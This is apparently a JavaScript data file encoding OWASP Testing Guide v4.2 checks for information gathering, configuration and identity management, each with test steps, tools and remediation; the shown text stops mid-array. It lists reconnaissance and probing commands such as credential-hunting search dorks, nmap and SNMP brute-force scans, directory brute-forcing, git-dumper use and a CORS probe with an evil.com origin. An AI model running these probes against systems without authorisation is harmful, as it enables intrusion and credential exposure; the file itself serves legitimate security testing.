// OWASP Testing Guide v4.2 — comprehensive web application security testing reference
// Each test maps to OWASP Testing Guide methodology with practical steps

export const OWASP_TESTING_GUIDE = [
  // ============================================================
  // INFORMATION GATHERING (OTG-INFO)
  // ============================================================
  {
    id: "OTG-INFO-001",
    category: "Information Gathering",
    name: "Conduct Search Engine Discovery and Reconnaissance",
    description: "Use search engines to discover publicly exposed information about the target application, including configuration details, source code, error messages, and sensitive data that may have been inadvertently indexed.",
    objectives: [
      "Identify sensitive design and configuration information exposed via search engines",
      "Discover cached or archived versions of the application",
      "Find exposed files, directories, and subdomains",
      "Locate third-party sites referencing the target"
    ],
    howToTest: [
      "Use Google dorks: site:target.com filetype:pdf, site:target.com inurl:admin, site:target.com intitle:index.of",
      "Search for exposed configuration: site:target.com ext:xml OR ext:conf OR ext:cnf OR ext:reg OR ext:inf OR ext:rdp OR ext:cfg OR ext:txt OR ext:ora OR ext:ini OR ext:env",
      "Search for exposed credentials: site:target.com intext:password OR intext:username filetype:log",
      "Check Google cache for recently removed content: cache:target.com",
      "Use Wayback Machine (web.archive.org) to find historical snapshots",
      "Search GitHub, GitLab, Bitbucket for code referencing the target domain",
      "Use Shodan, Censys to discover infrastructure and services",
      "Search Pastebin and paste sites for leaked data mentioning the domain",
      "Enumerate subdomains using search: site:*.target.com -www",
      "Check Certificate Transparency logs via crt.sh for subdomain discovery"
    ],
    tools: ["Google", "Bing", "DuckDuckGo", "Shodan", "Censys", "crt.sh", "Wayback Machine", "theHarvester", "Recon-ng", "SpiderFoot"],
    remediation: "Implement robots.txt and meta noindex tags for sensitive pages. Review and remove sensitive information from public repositories. Monitor for information leakage using Google Alerts. Use .htaccess or web server configuration to prevent directory listing.",
    references: ["OWASP Testing Guide v4.2 - OTG-INFO-001", "Google Hacking Database (GHDB)"],
    severity: "Low",
    owaspId: "OTG-INFO-001"
  },
  {
    id: "OTG-INFO-002",
    category: "Information Gathering",
    name: "Fingerprint Web Server",
    description: "Determine the type and version of web server software running on the target to identify known vulnerabilities and misconfigurations specific to that server technology.",
    objectives: [
      "Identify web server type and version",
      "Determine OS and technology stack",
      "Discover potential version-specific vulnerabilities"
    ],
    howToTest: [
      "Send HTTP request and analyze Server header: curl -I https://target.com",
      "Analyze HTTP response headers ordering (different servers have different default header orders)",
      "Send malformed requests and analyze error pages for version information",
      "Use HEAD method and compare response to GET to identify server behavior",
      "Check default error pages (404, 500) for server signatures",
      "Analyze supported HTTP methods with OPTIONS request",
      "Use tools like httprint or WhatWeb for automated fingerprinting",
      "Check for technology-specific headers: X-Powered-By, X-AspNet-Version, X-Generator",
      "Probe for server-specific default files: /server-status (Apache), /elmah.axd (.NET)",
      "Compare TCP/IP stack behavior (window size, TTL) for OS detection"
    ],
    tools: ["curl", "Netcat", "Nmap", "httprint", "WhatWeb", "Wappalyzer", "BuiltWith"],
    remediation: "Remove or modify Server header to prevent version disclosure. Customize error pages to remove technology information. Disable unnecessary HTTP methods. Remove default files and documentation.",
    references: ["OWASP Testing Guide v4.2 - OTG-INFO-002", "RFC 7231 - HTTP/1.1 Semantics"],
    severity: "Informational",
    owaspId: "OTG-INFO-002"
  },
  {
    id: "OTG-INFO-003",
    category: "Information Gathering",
    name: "Review Webserver Metafiles for Information Leakage",
    description: "Analyze metafiles such as robots.txt, sitemap.xml, and other configuration files that may reveal hidden directories, administrative interfaces, or sensitive application structure.",
    objectives: [
      "Identify disallowed directories in robots.txt",
      "Discover application structure from sitemap.xml",
      "Find hidden or restricted areas of the application",
      "Locate development or staging URLs"
    ],
    howToTest: [
      "Retrieve and analyze robots.txt: curl https://target.com/robots.txt",
      "Check for sitemap.xml: curl https://target.com/sitemap.xml",
      "Look for sitemap index files: sitemap_index.xml, sitemaps.xml",
      "Check for humans.txt, security.txt (.well-known/security.txt)",
      "Analyze crossdomain.xml for Flash/Silverlight policy",
      "Check clientaccesspolicy.xml for Silverlight cross-domain policy",
      "Look for .well-known directory entries (openid-configuration, jwks.json)",
      "Check for package manager files: package.json, composer.json, Gemfile",
      "Analyze Disallow entries in robots.txt as potential sensitive endpoints"
    ],
    tools: ["curl", "wget", "Burp Suite", "OWASP ZAP", "dirb"],
    remediation: "Avoid listing sensitive paths in robots.txt as it acts as a roadmap. Use authentication and authorization instead of obscurity. Restrict access to metafiles that expose application structure. Implement proper access controls on administrative interfaces.",
    references: ["OWASP Testing Guide v4.2 - OTG-INFO-003", "RFC 9309 - Robots Exclusion Protocol"],
    severity: "Informational",
    owaspId: "OTG-INFO-003"
  },
  {
    id: "OTG-INFO-004",
    category: "Information Gathering",
    name: "Enumerate Applications on Webserver",
    description: "Identify all applications hosted on the web server, including those running on non-standard ports, virtual hosts, or subdomains that may have weaker security controls.",
    objectives: [
      "Discover all web applications on the same server",
      "Identify applications on non-standard ports",
      "Enumerate virtual hosts and subdomains",
      "Find development, staging, or test instances"
    ],
    howToTest: [
      "Scan common ports for web services: nmap -sV -p 80,443,8080,8443,8000,3000,5000,9090 target.com",
      "Enumerate virtual hosts using wordlists: gobuster vhost -u target.com -w vhosts.txt",
      "Brute-force subdomains: subfinder -d target.com, amass enum -d target.com",
      "Check for applications in common paths: /app, /portal, /admin, /webmail, /api, /v1, /v2",
      "Analyze SSL/TLS certificates for Subject Alternative Names (SANs)",
      "Check reverse DNS records for the server IP",
      "Probe different HTTP Host headers to discover virtual hosts",
      "Use certificate transparency logs to find related domains"
    ],
    tools: ["Nmap", "Gobuster", "subfinder", "amass", "Aquatone", "httpx", "masscan"],
    remediation: "Remove unnecessary applications from production servers. Isolate development and staging environments. Apply consistent security controls across all hosted applications. Monitor for unauthorized applications.",
    references: ["OWASP Testing Guide v4.2 - OTG-INFO-004"],
    severity: "Informational",
    owaspId: "OTG-INFO-004"
  },
  {
    id: "OTG-INFO-005",
    category: "Information Gathering",
    name: "Review Webpage Content for Information Leakage",
    description: "Examine web page source code, comments, and metadata for sensitive information such as developer comments, internal paths, API keys, credentials, or debug information.",
    objectives: [
      "Find developer comments revealing application logic",
      "Discover hardcoded credentials or API keys",
      "Identify internal network information or paths",
      "Locate debug or diagnostic information"
    ],
    howToTest: [
      "View page source and search for HTML comments: <!-- -->",
      "Search for TODO, FIXME, HACK, BUG, XXX comments in JavaScript files",
      "Look for hardcoded API keys, tokens, passwords in client-side code",
      "Check meta tags for generator, author, and framework information",
      "Analyze JavaScript source maps (.map files) for original source code",
      "Search for internal IP addresses (10.x, 172.16-31.x, 192.168.x) in responses",
      "Look for error messages revealing stack traces or database information",
      "Check for exposed environment variables or configuration in client-side bundles",
      "Analyze included JavaScript libraries for known vulnerable versions",
      "Search for email addresses, phone numbers, or PII in page content"
    ],
    tools: ["Browser DevTools", "Burp Suite", "grep", "LinkFinder", "SecretFinder", "JSFinder", "retire.js"],
    remediation: "Remove all developer comments from production code. Never hardcode credentials in client-side code. Use environment variables for sensitive configuration. Minify and obfuscate production JavaScript. Remove source maps from production deployments.",
    references: ["OWASP Testing Guide v4.2 - OTG-INFO-005", "CWE-615: Inclusion of Sensitive Information in Source Code Comments"],
    severity: "Low",
    owaspId: "OTG-INFO-005"
  },
  {
    id: "OTG-INFO-006",
    category: "Information Gathering",
    name: "Identify Application Entry Points",
    description: "Map all entry points and data inputs of the application including forms, API endpoints, URL parameters, HTTP headers, cookies, and file uploads to understand the attack surface.",
    objectives: [
      "Identify all user-controllable input points",
      "Map HTTP methods used by each endpoint",
      "Document parameters, headers, and cookies accepted",
      "Understand data flow and processing"
    ],
    howToTest: [
      "Spider the application to discover all pages and forms",
      "Record all URL parameters (GET query strings)",
      "Identify POST body parameters in forms and API calls",
      "Note custom HTTP headers accepted by the application",
      "Document cookies set and their attributes",
      "Map file upload endpoints and accepted formats",
      "Identify WebSocket endpoints and message formats",
      "Check for hidden form fields and their purposes",
      "Analyze JavaScript for AJAX calls and API interactions",
      "Document REST API endpoints with methods (GET, POST, PUT, DELETE, PATCH)"
    ],
    tools: ["Burp Suite Spider", "OWASP ZAP Spider", "Postman", "Browser DevTools Network tab"],
    remediation: "Validate and sanitize all inputs at every entry point. Implement allowlist-based input validation. Use parameterized queries for database interactions. Apply principle of least privilege to each endpoint.",
    references: ["OWASP Testing Guide v4.2 - OTG-INFO-006"],
    severity: "Informational",
    owaspId: "OTG-INFO-006"
  },
  {
    id: "OTG-INFO-007",
    category: "Information Gathering",
    name: "Map Execution Paths Through Application",
    description: "Understand the application logic flows, business processes, and decision paths to identify areas where security controls may be bypassed or business logic can be abused.",
    objectives: [
      "Map user workflows and business processes",
      "Identify decision points and branching logic",
      "Document role-based access paths",
      "Find potential logic bypass opportunities"
    ],
    howToTest: [
      "Walk through each user role workflow from start to finish",
      "Document multi-step processes (registration, checkout, password reset)",
      "Identify state-dependent operations and their prerequisites",
      "Map the authentication and authorization decision tree",
      "Note where client-side decisions affect server-side behavior",
      "Test if steps in multi-step processes can be skipped or reordered",
      "Document API call sequences for complex operations",
      "Identify background processes triggered by user actions"
    ],
    tools: ["Burp Suite", "OWASP ZAP", "Browser DevTools", "draw.io"],
    remediation: "Enforce server-side validation for all business logic steps. Implement proper state management for multi-step processes. Do not rely on client-side controls for security decisions.",
    references: ["OWASP Testing Guide v4.2 - OTG-INFO-007"],
    severity: "Informational",
    owaspId: "OTG-INFO-007"
  },
  {
    id: "OTG-INFO-008",
    category: "Information Gathering",
    name: "Fingerprint Web Application Framework",
    description: "Identify the web application framework, CMS, or technology stack used by the target to look up known vulnerabilities, default credentials, and configuration weaknesses specific to that technology.",
    objectives: [
      "Identify the web framework or CMS in use",
      "Determine the framework version",
      "Find technology-specific vulnerabilities and misconfigurations",
      "Discover default files and credentials"
    ],
    howToTest: [
      "Check HTTP headers: X-Powered-By, X-Generator, X-Drupal-Cache, X-Magento-Vary",
      "Analyze HTML source for framework-specific markers (wp-content, /sites/default, __next)",
      "Check for default files: /wp-login.php (WordPress), /administrator (Joomla), /user/login (Drupal)",
      "Analyze cookie names: PHPSESSID (PHP), JSESSIONID (Java), ASP.NET_SessionId (.NET), _rails_session (Rails)",
      "Check for framework-specific error pages and their format",
      "Analyze URL patterns: .php, .asp, .jsp, clean URLs, /api/v1 (REST frameworks)",
      "Look for JavaScript framework artifacts: React (__NEXT_DATA__), Angular (ng-), Vue (__vue__)",
      "Check for technology-specific files: web.config (.NET), web.xml (Java), settings.py (Django)",
      "Use automated tools: Wappalyzer, WhatWeb, BuiltWith",
      "Probe for admin panels at framework-default URLs"
    ],
    tools: ["Wappalyzer", "WhatWeb", "BuiltWith", "WPScan", "Droopescan", "CMSeek", "Nikto"],
    remediation: "Remove or customize framework-identifying headers and cookies. Keep frameworks updated to latest stable versions. Change default admin panel URLs. Remove default and sample files.",
    references: ["OWASP Testing Guide v4.2 - OTG-INFO-008"],
    severity: "Informational",
    owaspId: "OTG-INFO-008"
  },
  {
    id: "OTG-INFO-009",
    category: "Information Gathering",
    name: "Fingerprint Web Application",
    description: "Identify the specific web application running, its version, and any customizations to determine applicable vulnerabilities and attack vectors.",
    objectives: [
      "Identify the exact application and version",
      "Determine if custom or commercial/open-source software",
      "Assess known vulnerabilities for the identified version"
    ],
    howToTest: [
      "Check for version identifiers in page source, headers, or footer",
      "Compare file hashes of static resources against known versions",
      "Analyze error messages for application-specific patterns",
      "Check for CHANGELOG, README, or VERSION files",
      "Use Nmap NSE scripts for application fingerprinting: nmap --script http-enum target.com",
      "Probe for application-specific admin or configuration pages",
      "Compare response behavior to documented application defaults"
    ],
    tools: ["Nmap", "Nikto", "WPScan", "Droopescan", "BlindElephant"],
    remediation: "Remove version information from public-facing pages. Restrict access to changelog and readme files. Keep applications updated. Customize default configurations.",
    references: ["OWASP Testing Guide v4.2 - OTG-INFO-009"],
    severity: "Informational",
    owaspId: "OTG-INFO-009"
  },
  {
    id: "OTG-INFO-010",
    category: "Information Gathering",
    name: "Map Application Architecture",
    description: "Understand the overall architecture of the application, including web servers, application servers, databases, load balancers, CDNs, WAFs, and other infrastructure components.",
    objectives: [
      "Identify all infrastructure components",
      "Determine network topology and trust boundaries",
      "Discover intermediary devices (WAF, load balancer, CDN, reverse proxy)",
      "Map data storage and processing locations"
    ],
    howToTest: [
      "Analyze HTTP headers for proxy/CDN indicators: Via, X-Cache, X-CDN, CF-Ray (Cloudflare), X-Amz-Cf-Id (CloudFront)",
      "Check for WAF presence: send known attack payloads and analyze blocking responses",
      "Identify load balancers by making multiple requests and comparing response headers/server IPs",
      "Use traceroute and DNS analysis to map network path",
      "Check for different behavior between HTTP and HTTPS (may indicate reverse proxy)",
      "Identify caching layers by analyzing Cache-Control, ETag, Age headers",
      "Probe for backend services by analyzing API responses and error messages",
      "Check for microservice architecture indicators (different response formats, latencies)",
      "Use tools like wafw00f to identify Web Application Firewalls"
    ],
    tools: ["wafw00f", "traceroute", "dig", "curl", "Nmap", "Burp Suite"],
    remediation: "Implement defense in depth across all architectural layers. Ensure consistent security controls regardless of entry path. Protect internal architecture details from external disclosure.",
    references: ["OWASP Testing Guide v4.2 - OTG-INFO-010"],
    severity: "Informational",
    owaspId: "OTG-INFO-010"
  },

  // ============================================================
  // CONFIGURATION AND DEPLOYMENT MANAGEMENT (OTG-CONFIG)
  // ============================================================
  {
    id: "OTG-CONFIG-001",
    category: "Configuration Management",
    name: "Test Network Infrastructure Configuration",
    description: "Review the network infrastructure and server configuration for known vulnerabilities, unnecessary services, and misconfigurations that could be exploited.",
    objectives: [
      "Identify unnecessary open ports and services",
      "Detect misconfigured network services",
      "Find administrative interfaces exposed to the internet",
      "Assess TLS/SSL configuration strength"
    ],
    howToTest: [
      "Port scan the target: nmap -sV -sC -p- target.com",
      "Check for unnecessary services: FTP (21), Telnet (23), SMTP (25), DNS (53), database ports (1433, 3306, 5432, 27017)",
      "Test SSL/TLS configuration: testssl.sh target.com or ssllabs.com",
      "Check for SNMP with default community strings: nmap -sU -p 161 --script snmp-brute target.com",
      "Verify SSH configuration: ssh -v target.com (check version, allowed auth methods)",
      "Test for HTTP methods: curl -X OPTIONS target.com",
      "Check for exposed management interfaces: /manager (Tomcat), /console (WebLogic, JBoss)",
      "Verify DNS zone transfer: dig axfr target.com @ns.target.com",
      "Check for IPv6 exposure if not intended",
      "Test for CORS misconfigurations on all endpoints"
    ],
    tools: ["Nmap", "testssl.sh", "SSLyze", "Nikto", "Masscan"],
    remediation: "Disable unnecessary services and ports. Harden TLS configuration to use only strong cipher suites. Restrict management interfaces to internal networks. Implement network segmentation.",
    references: ["OWASP Testing Guide v4.2 - OTG-CONFIG-001", "CIS Benchmarks"],
    severity: "Medium",
    owaspId: "OTG-CONFIG-001"
  },
  {
    id: "OTG-CONFIG-002",
    category: "Configuration Management",
    name: "Test Application Platform Configuration",
    description: "Assess the web server and application server configurations for security weaknesses, including default settings, verbose error messages, directory listings, and unnecessary features.",
    objectives: [
      "Verify server hardening against security benchmarks",
      "Identify default configurations that should be changed",
      "Test for information disclosure through error handling",
      "Check for unnecessary features or modules"
    ],
    howToTest: [
      "Check for directory listing: browse to directories without index files",
      "Verify custom error pages are configured (trigger 400, 403, 404, 500 errors)",
      "Test for server-status or server-info pages (Apache): /server-status, /server-info",
      "Check for default application pages: /index.html, /iisstart.htm, /default.asp",
      "Verify that TRACE method is disabled: curl -X TRACE target.com",
      "Check for WebDAV if not needed: curl -X PROPFIND target.com",
      "Test for HTTP PUT method: curl -X PUT -d 'test' target.com/test.txt",
      "Verify X-Frame-Options or CSP frame-ancestors is set",
      "Check for missing security headers: HSTS, X-Content-Type-Options, CSP",
      "Verify that debug mode is disabled in production"
    ],
    tools: ["Nikto", "Nmap", "curl", "Burp Suite", "SecurityHeaders.com"],
    remediation: "Follow vendor security hardening guides and CIS benchmarks. Disable directory listing. Configure custom error pages. Remove default and sample files. Disable unnecessary HTTP methods and modules. Set all recommended security headers.",
    references: ["OWASP Testing Guide v4.2 - OTG-CONFIG-002", "CIS Apache/Nginx/IIS Benchmarks"],
    severity: "Medium",
    owaspId: "OTG-CONFIG-002"
  },
  {
    id: "OTG-CONFIG-003",
    category: "Configuration Management",
    name: "Test File Extensions Handling for Sensitive Information",
    description: "Determine how the web server handles different file extensions to identify potential vulnerabilities from serving source code, configuration files, or backup files.",
    objectives: [
      "Identify file extensions that may expose source code",
      "Find backup and temporary files accessible via the web",
      "Determine if the server processes unexpected file types",
      "Discover configuration files accessible to unauthorized users"
    ],
    howToTest: [
      "Test for backup file extensions: .bak, .old, .orig, .save, .swp, .swo, ~, .copy, .tmp",
      "Check for source code extensions: .java, .py, .rb, .php~, .phps, .php.bak",
      "Look for configuration files: .config, .conf, .cfg, .ini, .yml, .yaml, .toml, .json, .xml, .env",
      "Test for compressed archives: .zip, .tar, .tar.gz, .rar, .7z, .gz",
      "Check for database files: .sql, .db, .sqlite, .mdb",
      "Test for version control files: .git/HEAD, .svn/entries, .hg/store",
      "Look for IDE/editor files: .idea/, .vscode/, .project, .settings/",
      "Check for log files: .log, access.log, error.log, debug.log",
      "Test for documentation: README.md, CHANGELOG.md, INSTALL.md, LICENSE"
    ],
    tools: ["Gobuster", "dirb", "dirsearch", "ffuf", "Burp Suite Intruder"],
    remediation: "Configure the web server to only serve intended file types. Block access to backup, source, and configuration files. Remove unnecessary files from production. Use .htaccess or server config to deny access to sensitive extensions.",
    references: ["OWASP Testing Guide v4.2 - OTG-CONFIG-003"],
    severity: "Medium",
    owaspId: "OTG-CONFIG-003"
  },
  {
    id: "OTG-CONFIG-004",
    category: "Configuration Management",
    name: "Review Old Backup and Unreferenced Files",
    description: "Search for old backup files, unreferenced pages, and forgotten resources that may contain sensitive information or provide additional attack vectors.",
    objectives: [
      "Find backup copies of the application or database",
      "Discover unreferenced files or directories",
      "Identify temporary or development files left on the server",
      "Locate database dumps or configuration backups"
    ],
    howToTest: [
      "Brute-force directories: gobuster dir -u target.com -w /usr/share/wordlists/dirb/common.txt",
      "Try predictable backup names: target.com.zip, backup.zip, site.tar.gz, db_backup.sql",
      "Check for timestamped backups: backup_2024.zip, db_20240101.sql",
      "Look for CMS-specific backup paths: /wp-content/debug.log (WordPress), /sites/default/files (Drupal)",
      "Test for common admin/config URLs: /phpinfo.php, /info.php, /test.php, /debug",
      "Check for exposed Git repositories: /.git/config (use git-dumper if found)",
      "Look for exposed .env files with credentials: /.env, /.env.local, /.env.production",
      "Check for Dockerfile or docker-compose.yml exposure",
      "Search for package lock files: package-lock.json, yarn.lock, Pipfile.lock, composer.lock"
    ],
    tools: ["Gobuster", "ffuf", "dirsearch", "Nikto", "git-dumper", "GitTools"],
    remediation: "Implement a deployment process that ensures only necessary files are published. Regularly audit production servers for unneeded files. Use CI/CD pipelines to automate clean deployments. Block access to version control directories.",
    references: ["OWASP Testing Guide v4.2 - OTG-CONFIG-004"],
    severity: "High",
    owaspId: "OTG-CONFIG-004"
  },
  {
    id: "OTG-CONFIG-005",
    category: "Configuration Management",
    name: "Enumerate Infrastructure and Application Admin Interfaces",
    description: "Discover administrative interfaces that could allow unauthorized access to application management, configuration, or data manipulation functions.",
    objectives: [
      "Locate application admin panels",
      "Find infrastructure management interfaces",
      "Identify cloud management consoles",
      "Test access controls on admin interfaces"
    ],
    howToTest: [
      "Check common admin paths: /admin, /administrator, /admin.php, /wp-admin, /manage, /dashboard, /cpanel, /console",
      "Check for CMS-specific admin: /wp-login.php, /administrator/index.php, /user/login, /admin/login",
      "Look for database admin tools: /phpmyadmin, /adminer.php, /pgadmin, /mongo-express",
      "Check for monitoring tools: /grafana, /kibana, /prometheus, /nagios, /munin, /cacti",
      "Test for application server consoles: /manager/html (Tomcat), /console (JBoss/WildFly)",
      "Check for API documentation: /swagger, /swagger-ui, /api-docs, /graphql, /graphiql",
      "Look for debugging tools: /elmah.axd (.NET), /debug (Django), /actuator (Spring Boot)",
      "Test for CI/CD interfaces: /jenkins, /gitlab, /sonarqube",
      "Scan non-standard ports: 8080, 8443, 9090, 9200, 5601, 3000, 8888"
    ],
    tools: ["Gobuster", "dirb", "Nmap", "Nikto", "Burp Suite"],
    remediation: "Restrict admin interfaces to internal networks or VPN. Implement strong authentication (MFA) on all admin interfaces. Change default admin URLs. Implement IP-based access controls. Remove unnecessary management tools from production.",
    references: ["OWASP Testing Guide v4.2 - OTG-CONFIG-005"],
    severity: "High",
    owaspId: "OTG-CONFIG-005"
  },
  {
    id: "OTG-CONFIG-006",
    category: "Configuration Management",
    name: "Test HTTP Methods",
    description: "Determine which HTTP methods are supported by the web server and application, and identify potentially dangerous methods that could be exploited for unauthorized operations.",
    objectives: [
      "Enumerate supported HTTP methods",
      "Identify dangerous methods (PUT, DELETE, TRACE, CONNECT)",
      "Test for arbitrary file upload via PUT",
      "Check for XST via TRACE"
    ],
    howToTest: [
      "Send OPTIONS request: curl -X OPTIONS -i target.com",
      "Test each method individually: HEAD, GET, POST, PUT, DELETE, PATCH, TRACE, CONNECT, PROPFIND, MKCOL",
      "Test PUT for file upload: curl -X PUT -d 'test content' target.com/testfile.txt",
      "Test TRACE for Cross-Site Tracing (XST): curl -X TRACE -i target.com",
      "Test DELETE for file removal: curl -X DELETE target.com/existingfile",
      "Check if methods differ by path (some directories may allow PUT while root does not)",
      "Test for method override headers: X-HTTP-Method-Override, X-Method-Override, X-HTTP-Method",
      "Check if POST can be converted to GET or vice versa (parameter pollution)"
    ],
    tools: ["curl", "Nmap (http-methods script)", "Burp Suite Repeater", "Nikto"],
    remediation: "Disable unnecessary HTTP methods. Specifically disable TRACE, PUT, DELETE, CONNECT, PROPFIND unless explicitly required. Configure the web server to only allow GET, POST, HEAD on most endpoints.",
    references: ["OWASP Testing Guide v4.2 - OTG-CONFIG-006", "CWE-16: Configuration"],
    severity: "Medium",
    owaspId: "OTG-CONFIG-006"
  },
  {
    id: "OTG-CONFIG-007",
    category: "Configuration Management",
    name: "Test HTTP Strict Transport Security (HSTS)",
    description: "Verify that HSTS is properly implemented to ensure all communications occur over HTTPS and prevent SSL stripping attacks.",
    objectives: [
      "Check for HSTS header presence",
      "Verify max-age is sufficiently long (at least 1 year)",
      "Check for includeSubDomains directive",
      "Verify preload readiness"
    ],
    howToTest: [
      "Check for HSTS header: curl -sI https://target.com | grep -i strict-transport-security",
      "Verify max-age value (should be >= 31536000 seconds / 1 year)",
      "Check for includeSubDomains flag",
      "Check for preload flag and HSTS preload list submission: hstspreload.org",
      "Test HTTP to HTTPS redirect: curl -I http://target.com (should 301 to HTTPS)",
      "Verify HSTS is set on the HTTPS response, not the HTTP redirect response",
      "Test that the redirect happens before any content is served on HTTP",
      "Check if HSTS header is set on all subdomains if includeSubDomains is used"
    ],
    tools: ["curl", "SSLyze", "testssl.sh", "SecurityHeaders.com"],
    remediation: "Implement HSTS with max-age of at least one year (31536000). Include the includeSubDomains directive. Submit to the HSTS preload list. Ensure HTTP redirects to HTTPS with a 301 status code.",
    references: ["OWASP Testing Guide v4.2 - OTG-CONFIG-007", "RFC 6797 - HTTP Strict Transport Security"],
    severity: "Medium",
    owaspId: "OTG-CONFIG-007"
  },
  {
    id: "OTG-CONFIG-008",
    category: "Configuration Management",
    name: "Test RIA Cross Domain Policy",
    description: "Review cross-domain policy files (crossdomain.xml, clientaccesspolicy.xml) for overly permissive configurations that could allow unauthorized cross-domain data access.",
    objectives: [
      "Identify overly permissive cross-domain policies",
      "Check for wildcard domain allowances",
      "Verify CORS configuration is appropriately restrictive"
    ],
    howToTest: [
      "Check for crossdomain.xml: curl target.com/crossdomain.xml",
      "Check for clientaccesspolicy.xml: curl target.com/clientaccesspolicy.xml",
      "Look for allow-access-from domain='*' (dangerous wildcard)",
      "Test CORS: curl -H 'Origin: https://evil.com' -I target.com/api/endpoint",
      "Check for Access-Control-Allow-Origin: * on sensitive endpoints",
      "Verify Access-Control-Allow-Credentials behavior with different origins",
      "Test if null origin is accepted: curl -H 'Origin: null' target.com/api",
      "Check for overly broad regex in origin validation"
    ],
    tools: ["curl", "Burp Suite", "CORScanner"],
    remediation: "Remove wildcard allows from cross-domain policies. Allowlist specific trusted domains. Never reflect the Origin header directly as Access-Control-Allow-Origin. Do not allow null origin with credentials. Remove crossdomain.xml if Flash is not used.",
    references: ["OWASP Testing Guide v4.2 - OTG-CONFIG-008", "CWE-942: Overly Permissive Cross-domain Whitelist"],
    severity: "High",
    owaspId: "OTG-CONFIG-008"
  },

  // ============================================================
  // IDENTITY MANAGEMENT (OTG-IDENT)
  // ============================================================
  {
    id: "OTG-IDENT-001",
    category: "Identity Management",
    name: "Test Role Definitions",
    description: "Identify and document all user roles within the application and verify that access controls are properly enforced based on roles and responsibilities.",
    objectives: [
      "Enumerate all user roles in the application",
      "Verify role-based access control enforcement",
      "Identify privilege escalation opportunities between roles",
      "Ensure separation of duties is maintained"
    ],
    howToTest: [
      "Create accounts with different role levels (user, moderator, admin, super admin)",
      "Document accessible features and endpoints for each role",
      "Attempt to access admin functions from a regular user account",
      "Test horizontal privilege escalation (accessing another user's data with same role)",
      "Test vertical privilege escalation (performing admin actions as regular user)",
      "Check if role information is stored client-side (cookies, localStorage, JWT claims)",
      "Attempt to modify role identifiers in requests",
      "Verify that role checks occur server-side for every sensitive operation",
      "Test if API endpoints enforce same role restrictions as the UI"
    ],
    tools: ["Burp Suite", "Browser DevTools", "Postman", "Autorize (Burp extension)"],
    remediation: "Implement role-based access control with server-side enforcement. Follow the principle of least privilege. Do not store role information in client-controllable locations. Audit role assignments regularly.",
    references: ["OWASP Testing Guide v4.2 - OTG-IDENT-001", "CWE-285: Improper Authorization"],
    severity: "High",
    owaspId: "OTG-IDENT-001"
  },
  {
    id: "OTG-IDENT-002",
    category: "Identity Management",
    name: "Test User Registration Process",
    description: "Evaluate the user registration process for weaknesses that could allow mass account creation, identity fraud, or registration of privileged accounts.",
    objectives: [
      "Identify if registration can be automated (no CAPTCHA)",
      "Test for duplicate account creation",
      "Check for privilege escalation during registration",
      "Verify email/identity verification requirements"
    ],
    howToTest: [
      "Test if registration requires email verification",
      "Attempt to register with admin, administrator, root, system as username",
      "Try to register with an existing user email (information disclosure)",
      "Test for CAPTCHA effectiveness and bypass",
      "Check if role parameter can be added to registration request",
      "Test rate limiting on registration endpoint",
      "Try to register with special characters, very long usernames, or Unicode",
      "Verify that registration tokens/links expire appropriately",
      "Check if registration endpoint leaks existing usernames/emails"
    ],
    tools: ["Burp Suite", "Postman", "curl"],
    remediation: "Implement CAPTCHA on registration forms. Require email verification. Rate-limit registration attempts. Do not disclose whether an email is already registered. Validate all registration inputs server-side.",
    references: ["OWASP Testing Guide v4.2 - OTG-IDENT-002"],
    severity: "Medium",
    owaspId: "OTG-IDENT-002"
  },
  {
    id: "OTG-IDENT-003",
    category: "Identity Management",
    name: "Test Account Provisioning Process",
    description: "Review the account provisioning and de-provisioning process to ensure proper controls exist for creating, modifying, and disabling user accounts.",
    objectives: [
      "Verify authorized provisioning workflows",
      "Check that deprovisioned accounts are properly disabled",
      "Test for orphaned or forgotten accounts",
      "Ensure proper approval process for privileged accounts"
    ],
    howToTest: [
      "Review account creation workflow and approvals required",
      "Test if deactivated accounts can still authenticate",
      "Check for default accounts: admin/admin, test/test, demo/demo, guest/guest",
      "Verify that suspended users lose all active sessions",
      "Test if deleted account credentials can be used to create a new account",
      "Check for service accounts with hardcoded or shared credentials",
      "Verify account lockout/suspension is enforced consistently across all channels (web, API, mobile)"
    ],
    tools: ["Manual testing", "Burp Suite"],
    remediation: "Implement formal provisioning and deprovisioning processes. Disable rather than delete accounts initially. Remove all sessions when accounts are disabled. Audit accounts regularly for orphaned or unauthorized accounts.",
    references: ["OWASP Testing Guide v4.2 - OTG-IDENT-003"],
    severity: "Medium",
    owaspId: "OTG-IDENT-003"
  },
  {
    id: "OTG-IDENT-004",
    category: "Identity Management",
    name: "Test for Account Enumeration and Guessable User Account",
    description: "Determine if it is possible to enumerate valid usernames or email addresses through different application responses to valid versus invalid credentials.",
    objectives: [
      "Identify username enumeration via login page",
      "Test enumeration through registration page",
      "Check password reset for enumeration",
      "Analyze response differences (content, timing, status codes)"
    ],
    howToTest: [
      "Submit valid username with wrong password and invalid username with wrong password - compare responses",
      "Analyze response time differences between valid and invalid usernames",
      "Check response body size differences between valid and invalid usernames",
      "Test registration endpoint with existing email/username",
      "Test password reset with valid and invalid emails",
      "Analyze HTTP status codes for differences",
      "Check for specific error messages: 'Invalid username' vs 'Invalid password' (should be generic)",
      "Test API endpoints for user lookup functionality",
      "Use timing attacks to enumerate users: measure response time with valid vs invalid usernames"
    ],
    tools: ["Burp Suite Intruder", "ffuf", "Hydra", "Custom scripts"],
    remediation: "Use identical generic error messages for all authentication failures (e.g., 'Invalid credentials'). Ensure consistent response times regardless of username validity. Use CAPTCHA after multiple failed attempts. Implement account lockout.",
    references: ["OWASP Testing Guide v4.2 - OTG-IDENT-004", "CWE-204: Observable Response Discrepancy"],
    severity: "Medium",
    owaspId: "OTG-IDENT-004"
  },
  {
    id: "OTG-IDENT-005",
    category: "Identity Management",
    name: "Test for Weak or Unenforced Username Policy",
    description: "Evaluate the username policy for weaknesses that could facilitate brute-force attacks or social engineering.",
    objectives: [
      "Determine if usernames are predictable (sequential, email-based)",
      "Check minimum username length requirements",
      "Test for restricted username values",
      "Verify username uniqueness enforcement"
    ],
    howToTest: [
      "Check if usernames follow a predictable pattern (user001, user002)",
      "Test minimum length requirements (single character, empty string)",
      "Test for special characters in usernames",
      "Attempt to use email addresses as usernames",
      "Check if usernames are case-sensitive",
      "Verify that system/reserved usernames are blocked",
      "Test for Unicode character handling in usernames"
    ],
    tools: ["Manual testing", "Burp Suite"],
    remediation: "Enforce minimum username length. Block system and reserved usernames. Allow flexible but validated username formats. Consider using email addresses as usernames for uniqueness.",
    references: ["OWASP Testing Guide v4.2 - OTG-IDENT-005"],
    severity: "Low",
    owaspId: "OTG-IDENT-005"
